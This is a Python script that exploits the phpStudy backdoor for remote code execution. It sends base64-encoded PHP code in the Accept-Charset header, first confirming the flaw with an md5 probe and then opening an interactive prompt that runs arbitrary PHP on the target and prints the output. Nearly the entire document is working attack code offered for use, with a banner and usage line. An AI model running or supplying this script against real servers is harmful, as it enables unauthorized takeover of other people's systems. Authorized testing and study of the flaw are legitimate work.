import requests
import base64
import sys

print(r"""
       _               _             _         _____   _____ ______ 
      | |             | |           | |       |  __ \ / ____|  ____|
 _ __ | |__  _ __  ___| |_ _   _  __| |_   _  | |__) | |    | |__   
| '_ \| '_ \| '_ \/ __| __| | | |/ _` | | | | |  _  /| |    |  __|  
| |_) | | | | |_) \__ \ |_| |_| | (_| | |_| | | | \ \| |____| |____ 
| .__/|_| |_| .__/|___/\__|\__,_|\__,_|\__, | |_|  \_\\_____|______|
| |         | |                         __/ |                       
|_|         |_|                        |___/     

Example : python3 phpstudy_rce.py http://192.168.1.45/

""")

def check(url,header):
    header['Accept-Charset'] = "cHJpbnRmKG1kNSg0NTczMTM0NCkpOw=="
    try:
        flag = requests.get(url=url,headers=header,timeout=4)
        if "a5952fb670b54572bcec7440a554633e" in flag.text:
            return 1
        else:
            return 0
    except Exception as e:
        return 0

def shell(url,header,command):
    command_base = str(base64.b64encode(command.encode('utf-8')),'utf-8')
    try:
        old = requests.get(url,header,timeout=4)
        page = str(old.text)
        header['Accept-Charset'] = command_base
        flag = requests.get(url=url,headers=header,timeout=4)
        result = flag.text.replace(page," ")
        print(result)
    except Exception as e:
        print("Wring")

if __name__ == "__main__":
    header = {
        "Cache-Control" : "max-age=0",
        "Upgrade-Insecure-Requests" : "1",
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36",
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
        "Accept-Encoding" :"gzip,deflate",
        "Content-Length" : "0",
        "Accept-Language" : "zh-CN,zh;q=0.9",
        "Connection" : "close"
    }
    url = sys.argv[1]
    if check(url,header):
        print('\033[1;32mThe vulnerability exists！ \033[0m')
        print("Type exit to exit the session......\n")
        while True:
            payload = input("input php_code>")
            if payload in "exit":
                print("Byebye!")
                break
            shell(url,header,payload)
    else:
        print('\033[1;31mThere are no bugs or accidents！ \033[0m')
